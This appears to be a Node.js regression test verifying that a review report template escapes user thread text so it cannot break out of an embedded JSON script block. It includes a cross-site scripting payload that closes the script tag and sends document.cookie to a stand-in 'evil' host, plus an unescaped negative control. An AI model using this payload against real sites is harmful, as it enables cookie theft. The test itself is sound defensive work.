// Regression fixture for sec-1: raw thread text must not be able to terminate the
// REVIEW_DATA <script type="application/json"> seam. The skill MUST HTML-neutralize
// the serialized JSON before injection (escape < > & to < > & — see
// references/review-data-schema.md §Seam-injection safety and SKILL.md step 6).
//
// Run: node __tests__/seam-injection.test.cjs   (exits non-zero on failure)
const fs = require("fs");
const path = require("path");
const assert = require("assert");
const bs = String.fromCharCode(92); // backslash

const TPL = path.join(__dirname, "..", "references", "report-template.html");
const template = fs.readFileSync(TPL, "utf8");
const SEAM = '<script id="review-data" type="application/json">/*__REVIEW_DATA__*/</script>';
assert(template.includes(SEAM), "template exposes the REVIEW_DATA seam");

// The mandated escaping recipe. Any injector (skill LLM or fallback) must apply it.
function htmlNeutralizeJson(jsonText) {
  return jsonText
    .replace(/&/g, bs + "u0026")
    .replace(/</g, bs + "u003c")
    .replace(/>/g, bs + "u003e");
}
function inject(text) {
  return template.replace(SEAM,
    '<script id="review-data" type="application/json">' + text + "</script>");
}
// Simulate the HTML parser: a raw-text script element ends at the FIRST </script>.
function firstSeamBody(html) {
  const open = '<script id="review-data" type="application/json">';
  const start = html.indexOf(open) + open.length;
  return html.slice(start, html.indexOf("</script>", start));
}
function countScriptOpens(html) { return (html.match(/<script(\s|>)/g) || []).length; }

// Attacker payload in user-controlled thread text (from the uncommitted state file).
const PAYLOAD = "</script><script>fetch('//evil/'+document.cookie)</script>";
const reviewData = {
  meta: { branch: "feat/x", base: "main" },
  counts: { critical: 0, high: 0, medium: 0, low: 0, info: 0, acknowledged: 0 },
  findings: [{
    id: "b1", fingerprint: "bugs|f.ts|x", severity: "low", section: "bugs",
    title: "X", file: "f.ts", line: 1, state: "open",
    thread: [{ author: "user", text: PAYLOAD, ts: "2026-07-18T00:00:00Z" }]
  }],
  reviewState: { version: 1, branch: "feat/x", findings: { "bugs|f.ts|x": {
    state: "open", lastFinding: null, history: [],
    thread: [{ author: "user", text: PAYLOAD, ts: "2026-07-18T00:00:00Z" }]
  } } },
  files: []
};
const jsonText = JSON.stringify(reviewData);

// --- The fix: escaped injection keeps the seam intact and the payload inert ---
const outSafe = inject(htmlNeutralizeJson(jsonText));
assert(!outSafe.includes(PAYLOAD), "escaped output must not contain the raw payload");
assert(!outSafe.includes("</script><script>"), "no attacker script close/open sequence survives");
assert.strictEqual(countScriptOpens(outSafe), countScriptOpens(template),
  "payload must introduce no new <script> tag — document has only the template's scripts");
const parsed = JSON.parse(firstSeamBody(outSafe));
assert.strictEqual(parsed.findings[0].thread[0].text, PAYLOAD, "payload round-trips as inert data");
assert.strictEqual(parsed.reviewState.findings["bugs|f.ts|x"].thread[0].text, PAYLOAD,
  "embedded envelope thread round-trips too");

// --- Negative control: unescaped injection reproduces the vulnerability ---
const outVuln = inject(jsonText);
assert(outVuln.includes("</script><script>"), "control: unescaped injection leaks the attacker sequence");
let vulnParses = true;
try { JSON.parse(firstSeamBody(outVuln)); } catch (e) { vulnParses = false; }
assert(!vulnParses, "control: unescaped seam truncates at the payload's </script>");

console.log("PASS: seam-injection (sec-1) — escaped seam intact + payload inert; vuln reproduced unescaped");
